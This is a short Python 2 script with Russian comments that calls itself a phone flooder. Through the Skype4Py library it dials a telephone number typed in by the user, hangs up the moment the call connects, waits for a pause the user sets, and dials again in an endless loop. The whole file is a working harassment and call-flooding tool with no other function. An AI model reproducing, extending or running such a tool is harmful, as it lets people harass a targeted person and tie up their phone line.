#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Флудер телефонов. Работает со skype. У вас должен быть положительный баланс на skype аккаунте.
# Для работы необходимы:
# Python: http://downloads.activestate.com/ActivePython/windows/2.6/ActivePython-2.6.1.1-win32-x86.msi
# Skype4Py: http://garr.dl.sourceforge.net/sourceforge/skype4py/Skype4Py-1.0.31.0.win32.exe
# Skype: http://www.skype.com/intl/ru/download/
#
# version 0.2
# created by inlanger

import sys, time, Skype4Py
from Skype4Py import call

num = raw_input("Input tel number, like +1234567890: ")
pause = raw_input("Input pause(sec): ")
while 1==1:
    # This variable will get its actual value in OnCall handler
    CallStatus = 0
    
    # Here we define a set of call statuses that indicate a call has been either aborted or finished
    CallIsFinished = set ([Skype4Py.clsFailed, Skype4Py.clsFinished, Skype4Py.clsMissed, Skype4Py.clsRefused, Skype4Py.clsBusy, Skype4Py.clsCancelled]);
    
    def AttachmentStatusText(status):
       return skype.Convert.AttachmentStatusToText(status)
    
    def CallStatusText(status):
        return skype.Convert.CallStatusToText(status)
    
    # This handler is fired when status of Call object has changed
    def OnCall(call, status):
        global CallStatus
        CallStatus = status
        print 'Call status: ' + CallStatusText(status)
        if CallStatusText(status)=='Call in Progress': #Call in progress
            call.Finish()
            print "Waiting pause..."
    
    
    # This handler is fired when Skype attatchment status changes
    def OnAttach(status):
        print 'API attachment status: ' + AttachmentStatusText(status)
        if status == Skype4Py.apiAttachAvailable:
            skype.Attach()
    
    # Let's see if we were started with a command line parameter..
    try:
        CmdLine = num
    except:
        print 'Missing command line parameter'
        sys.exit()
    
    # Creating Skype object and assigning event handlers..
    skype = Skype4Py.Skype()
    skype.OnAttachmentStatus = OnAttach
    skype.OnCallStatus = OnCall
    
    # Starting Skype if it's not running already..
    if not skype.Client.IsRunning:
        print 'Starting Skype..'
        skype.Client.Start()
    
    # Attatching to Skype..
    print 'Connecting to Skype..'
    skype.Attach()
    skype.PlaceCall(CmdLine)
    
    # Checking if what we got from command line parameter is present in our contact list
    Found = False
    
    
    # Loop until CallStatus gets one of "call terminated" values in OnCall handler
    while not CallStatus in CallIsFinished:
        pass
    
    time.sleep(int(pause))